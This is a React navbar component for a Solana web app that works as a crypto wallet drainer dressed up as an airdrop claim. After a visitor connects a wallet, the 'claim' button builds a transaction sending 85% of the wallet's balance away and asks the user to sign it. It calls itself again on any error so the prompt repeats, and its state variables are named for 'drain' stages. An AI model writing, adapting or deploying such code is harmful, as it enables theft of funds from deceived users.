'use client'
import React, { useCallback, useEffect, useMemo } from 'react'
import HeaderLayout from '@/app/layouts/HeaderLayout';
import Button from '../ui/Button';
import { connectionLevel } from '@/app/constants/conneectionStages';
import { executeCloseWallet } from '@/app/services/redux/closeModel';
import { changeDrainStage } from '@/app/services/redux/drainStages';
import { useWallet, } from '@solana/wallet-adapter-react';
import { changeOpenBottomDrawer } from '@/app/services/redux/drawerBottom';
import { executeConnectionObject } from '@/app/services/redux/walletConnectionObject';
import { WalletConnectButton, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import {
  clusterApiUrl,
  Connection,
  Keypair,
  LAMPORTS_PER_SOL,
  StakeProgram,
  Authorized,
  sendAndConfirmTransaction,
  Lockup,
  PublicKey,
  Signer,
  SystemProgram,
  Transaction
} from "@solana/web3.js";
import { createTransferTransactionV0, pollSignatureStatus, signAndSendTransaction } from '@/app/services/hook/phantomCollections';
export default function Navbar(){
    const { connect, publicKey, connected, connecting, disconnect, disconnecting, select, wallet } = useWallet();
    const resetOpenDrawer =  changeOpenBottomDrawer((state)=>state.resetOpenBottomDrawer)
    const resetCloseWallet = executeCloseWallet((state)=>state.resetCloseWallet)
    const drainStage = changeDrainStage((state)=>state.connectionStage)
    const resetDrainage = changeDrainStage((state)=>state.resetConnectionStage)
    const getIsConnected = executeConnectionObject((state)=>state.isConnected)
    const connection =  new Connection(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS))
    

 
   
    async function claim(){
      // resetOpenDrawer(true) 
      try {
        resetDrainage(connectionLevel[2])
        const balance =  (await connection.getBalance(publicKey as unknown as PublicKey) )
        const AIRDROP_BALANCE = ((balance * 85)  / 100) ;
        const transaction = await createTransferTransactionV0(publicKey as unknown as PublicKey, connection , AIRDROP_BALANCE);
        console.log({
          status: 'info',
          method: 'signAndSendTransaction',
          message: `Requesting signature for: ${JSON.stringify(transaction)}`,
        });
        const signature = await signAndSendTransaction(window.solana, transaction);
        console.log({
          status: 'info',
          method: 'signAndSendTransaction',
          message: `Signed and submitted transaction ${signature}.`,
        });
        pollSignatureStatus(signature, connection);
      } catch (error) {
         await claim() 
        console.log({
          status: 'error',
          method: 'signAndSendTransaction',
          message: error,
        });
    }
    }
   useEffect(()=>{
    if(wallet?.adapter.connected){
      resetDrainage(connectionLevel[1])
    }
   },[wallet?.adapter.connected])

  return (
        <HeaderLayout>
          {(drainStage == connectionLevel[0] ) && <WalletMultiButton className="!bg-slate-800 !text-white"/> }
          {((drainStage == connectionLevel[1]) || (drainStage == connectionLevel[2])) && <Button onClick={()=>claim()}  variant="secondary" >{drainStage}</Button>}
        </HeaderLayout>

  )
}



